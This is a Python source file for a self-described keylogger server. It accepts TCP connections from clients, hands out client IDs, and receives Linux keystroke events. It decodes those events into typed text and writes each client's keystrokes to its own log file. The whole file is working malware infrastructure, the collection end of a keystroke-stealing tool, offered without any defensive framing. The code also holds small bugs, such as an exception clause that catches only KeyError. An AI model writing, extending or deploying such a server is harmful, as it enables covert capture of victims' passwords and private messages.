#!/usr/bin/env python3
import logging
import argparse
import socketserver
import struct
import configparser
import threading
import os
import errno

import protocol
import keyboard


class UnknownMessageType(Exception):
    """Raised when received message with unknown type"""
    pass


class IllegalMessageType(Exception):
    """Raised when received message with illegal type"""
    pass


class ConnectionEnd(Exception):
    """Raised when client closed connection"""
    pass


class TCPHandler(socketserver.BaseRequestHandler):
    """
    The RequestHandler class for server.

    It is instantiated once per connection to the server,
    implements communication with the client.
    """

    def __init__(self, *args):
        self.client_id = -1
        self.new_client = False
        super().__init__(*args)

    def handle(self):
        try:
            self.server.logger.info('Serving request from  ' + self._client_address_str())
            self._handshake()

            while True:
                msg_type = self._recv_msg_type()
                if msg_type is protocol.ClientMsgTypes.BYE:
                    self.preprocess_bye(msg_type)
                elif msg_type is protocol.ClientMsgTypes.SEND:
                    self.preprocess_send(msg_type)
                else:
                    raise IllegalMessageType()
        except ConnectionError:
            self.server.logger.warning('Connection error from ' + self._client_address_str())
        except UnknownMessageType:
            self.server.logger.warning('Received wrong message type from ' + self._client_address_str())
            self.request.sendall(struct.pack('>B', protocol.Error.UNKNOWN_MSG_TYPE))
        except IllegalMessageType:
            self.server.logger.warning('Received illegal message type from ' + self._client_address_str())
            self.request.sendall(struct.pack('>B', protocol.Error.ILLEGAL_MSG_TYPE))
        except ConnectionEnd:
            pass
        finally:
            self.server.logger.warning('Connection with ' + self._client_address_str() + ' terminated')
            if self.client_id != -1:
                self.server.unregister_id(self.client_id)

    def preprocess_hello(self, msg_type):
        self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())

    def preprocess_send(self, msg_type):
        self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())
        data = self._recv_all(4)
        length = struct.unpack('>I ', data)[0]
        data = self._recv_all(length)
        with open('log/' + str(self.client_id) + '.log', 'a+') as client_log_file:
            try:
                client_log_file.write(parse(data))
                self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK))
            except KeyError or IndexError:
                self.server.logger.warning('Cannot parse data  from ' + self._client_address_str())
                self.request.sendall(struct.pack('>B', protocol.Error.PARSE_ERROR))

    def preprocess_bye(self, msg_type):
        self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())
        raise ConnectionEnd()

    def _handshake(self):
        msg_type = self._recv_msg_type()
        if msg_type is not protocol.ClientMsgTypes.HELLO:
            raise IllegalMessageType()

        self.server.logger.info('Received message with type ' + msg_type.name + ' from ' + self._client_address_str())

        while not self._set_up_connection():
            msg_type = self._recv_msg_type()
            if msg_type is protocol.ClientMsgTypes.HELLO:
                self.preprocess_hello(msg_type)
            elif msg_type is protocol.ClientMsgTypes.BYE:
                self.preprocess_bye(msg_type)
            else:
                raise IllegalMessageType()

    def _recv_msg_type(self):
        data = self._recv_all(1)
        msg_type = struct.unpack('>B', data)[0]
        if msg_type not in map(int, protocol.ClientMsgTypes):
            raise UnknownMessageType()
        return protocol.ClientMsgTypes(msg_type)

    def _set_up_connection(self):
        protocol_version = struct.unpack('>I', self._recv_all(4))[0]
        client_id = struct.unpack('>I', self._recv_all(4))[0]

        if protocol_version != protocol.VERSION:
            self.server.logger.info(self._client_address_str() + ' wants to communicate via unsupported protocol')
            self.request.sendall(struct.pack('>B', protocol.Error.UNSUPPORTED_PROTOCOL))
            return False

        if not self._check_client_id(client_id):
            self.server.logger.info(self._client_address_str() + ' has invalid ID')
            self.request.sendall(struct.pack('>B', protocol.Error.INVALID_ID))
            return False
        return True

    def _check_client_id(self, client_id):
        if client_id == 0xFFFFFFFF:
            self.client_id = self.server.get_new_id()
            self.new_client = True
            self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK_NEW_ID) + struct.pack('>I', self.client_id) + struct.pack('>I', 0))
            return True

        if self.server.is_id_valid(client_id):
            self.client_id = client_id
            self.request.sendall(struct.pack('>B', protocol.ServerMsgTypes.OK))
            return True
        return False

    def _recv_all(self, length):
        data = b''
        while len(data) < length:
            more = self.request.recv(length - len(data))
            if not more:
                raise ConnectionError
            data += more
        return data

    def _client_address_str(self):
        return self.client_address[0] + ':' + str(self.client_address[1])


class Server(socketserver.TCPServer):
    def __init__(self, host, port, TCPHandler, config_file, log_file=None, logger_name='logger', console=True):
        super().__init__((host, port), TCPHandler)
        mkdir_if_not_exist('log')
        self.logger = logging.getLogger(logger_name)
        self._format_logger(log_file, console)
        self.config = configparser.RawConfigParser()
        self.config_file = config_file
        self.mutex = threading.Lock()
        self.connected_clients_id = []

    def serve_forever(self, poll_interval=0.5):
        self.logger.info('Starting server...')
        super().serve_forever(poll_interval)

    def shutdown(self):
        self.logger.info('Shutting down...')
        super().shutdown()

    def get_new_id(self):
        with self.mutex:
            self.config.read(self.config_file)
            id = self.config.getint('Client ID', 'id')
            self.config.set('Client ID', 'id', str(id + 1))
            with open(self.config_file, 'w') as config_file:
                self.config.write(config_file)
            self.connected_clients_id.append(id)
            return id

    def is_id_valid(self, id):
        with self.mutex:
            self.config.read(self.config_file)
            max_id = self.config.getint('Client ID', 'id')
            if not 0 <= id < max_id or id in self.connected_clients_id:
                return False
            self.connected_clients_id.append(id)
            return True

    def unregister_id(self, id):
        with self.mutex:
            self.connected_clients_id.remove(id)

    def _format_logger(self, log_file, console):
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(levelname)-8s [%(asctime)s] %(message)s', '%H:%M:%S %m-%d-%Y')

        if log_file:
            file_handler = logging.FileHandler(log_file, mode='w')
            file_handler.setFormatter(formatter)
            self.logger.addHandler(file_handler)
        if console:
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(formatter)
            self.logger.addHandler(console_handler)


def mkdir_if_not_exist(path):
    try:
        os.makedirs(path)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise


def parse(data):
    result = ''
    for i in range(0, len(data), 2):
        if int(data[i]) == keyboard.LinuxKeyboardAction.DOWN or int(data[i]) == keyboard.LinuxKeyboardAction.HOLD:
            result += keyboard.LinuxKeycodeMapper[data[i + 1]]
        elif int(data[i]) == keyboard.LinuxKeyboardAction.OMIT:
            result += ' OMITTED: ' + str(data[i + 1]) + ' '
        elif int(data[i]) != keyboard.LinuxKeyboardAction.UP:
            raise KeyError
    return result


def parse_arguments():
    parser = argparse.ArgumentParser(description='Keylogger server')
    parser.add_argument('-H', '--host', dest='host', type=str, default='localhost',
                        help='Address on which server will be running (default localhost)')
    parser.add_argument('-p', '--port', dest='port', type=int, default=2000, help='Port on which server will be running (default 2000)')
    parser.add_argument('-c', '--config', dest='config_file', type=str, default='config.ini',
                        help='Path to file which contains proxy server configuration (default config.ini)')
    parser.add_argument('-l', '--log', dest='log_file', type=str, default='log/server.log',
                        help='Server log file path (default log/server.log)')
    args = parser.parse_args()
    return args


def main():
    args = parse_arguments()
    print(args)
    server = Server(args.host, args.port, TCPHandler, args.config_file, args.log_file)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()
        server.server_close()


if __name__ == '__main__':
    main()
